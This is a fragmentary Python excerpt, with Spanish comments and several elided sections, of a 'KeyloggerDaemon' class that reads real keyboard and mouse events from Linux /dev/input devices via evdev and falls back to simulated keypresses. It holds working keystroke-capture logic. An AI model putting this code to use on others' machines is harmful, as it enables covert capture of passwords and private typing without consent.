...
class KeyloggerDaemon:
    ...
    def capture_real_events(self):
        """
        Captura eventos HID reales de /dev/input/event*.
        Usa select.select() para monitorear múltiples dispositivos simultáneamente.
        """
        try:
            import evdev
            from evdev import ecodes
            import select
            print("\n🎯 Capturando eventos HID reales...")
        except ImportError:
            print("\n⚠️  evdev no instalado - usando simulación")
        ...
        try:
            ...
            print("   Usando simulación...")
            return self.simulate_keypresses()
        
        if not devices:
            print("⚠️  No se encontraron dispositivos HID - usando simulación")
            return self.simulate_keypresses()
        
        # Filtrar SOLO teclados físicos (excluir botones de power, video bus, etc.)
        active_devices = []
        for dev in devices:
            caps = dev.capabilities()
            
            # Solo dispositivos que tengan EV_KEY (teclas)
            if self.keylogger.capture_keyboard and ecodes.EV_KEY in caps:
                # Excluir dispositivos que NO son teclados reales
                if any(keyword in dev.name.lower() for keyword in 
                       ['power button', 'sleep button', 'video bus', 'lid switch']):
                    print(f"   ⏭️  Excluido (sistema): {dev.name}")
                    continue
                
                print(f"   🎹 Teclado: {dev.name}")
                active_devices.append(dev)
            
            # Mouse si está habilitado
            elif self.keylogger.capture_mouse and ecodes.EV_REL in caps:
                print(f"   🖱️  Mouse: {dev.name}")
                active_devices.append(dev)
        
        if not active_devices:
            print("⚠️  Ningún dispositivo coincide con los filtros - usando simulación")
            return self.simulate_keypresses()
        
        print(f"\n▶️  Escuchando {len(active_devices)} dispositivo(s) (Ctrl+C para detener)...")
        
        try:
            while not self.keylogger.shutdown_event.is_set():
                # Usar select para monitorear MÚLTIPLES dispositivos simultáneamente
                ...
                for device in readable:
                    try:
                        for event in device.read():
                            ...
                            # Procesar solo eventos de teclado (EV_KEY) con value=1 (press)
